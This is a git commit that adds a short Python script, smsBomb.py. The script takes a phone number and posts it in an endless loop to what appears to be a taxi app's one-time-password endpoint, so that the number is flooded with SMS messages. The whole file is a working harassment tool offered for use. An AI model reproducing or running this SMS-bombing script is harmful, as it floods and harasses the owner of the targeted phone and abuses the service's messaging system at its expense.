e143ab34aaa315ed8114c4ccd368afbda7700a1d
Ali Mafi <92375925+Ali-Mafi@users.noreply.github.com>
2021-10-19 20:57:21 +0330

    Add files via upload

---
+++ smsBomb.py
@@ -0,0 +1,12 @@
+import requests
+
+url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
+phonen = input('phone number: ')
+
+pnd = {'cellphone': f'{phonen}'}
+
+while True: 
+
+    req = requests.post(url, json=pnd)
+
+    print(req.text)
